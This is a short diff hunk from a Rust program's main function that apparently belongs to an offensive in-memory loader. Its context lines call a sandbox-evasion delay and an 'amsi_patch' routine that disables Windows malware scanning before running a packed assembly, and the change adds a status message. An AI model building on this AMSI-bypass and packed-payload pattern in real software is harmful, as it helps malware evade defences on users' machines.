@@ -178,6 +178,8 @@ async fn main() {
     time_delay(10.0);
     amsi_patch();
 
+    println!("{}", lc!("[+] Executing assembly"));
+
     let mut bin_data: Vec<u8> = vec![SYNPACK_DATA];
 
     let mut args: Vec<String> = vec![SYNPACK_ARGS];
